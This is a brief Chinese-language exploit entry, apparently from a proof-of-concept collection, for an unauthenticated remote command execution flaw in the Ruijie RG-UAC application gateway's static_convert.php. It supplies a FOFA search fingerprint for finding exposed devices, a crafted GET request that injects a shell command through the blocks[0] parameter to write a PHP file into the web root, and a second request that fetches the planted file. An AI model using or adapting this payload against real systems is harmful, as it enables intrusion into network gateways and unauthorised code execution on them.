# 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`fofa：app="Ruijie-RG-UAC"`
- **请求**：`GET /view/IPV6/naborTable/static_convert.php?blocks[0]=echo%20%27<?php%20echo%20md5("666");unlink(__FILE__);?>%27%20>/var/www/html/ceshi.php HTTP/1.1`

**请求体 / payload**
```
GET /ceshi.php HTTP/1.1
Host:
Content-Length: 0
>
```

**其他**
- 锐捷RG-UAC应用网关static_convert.php前台RCE漏洞: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: 锐捷RG-UAC应用网关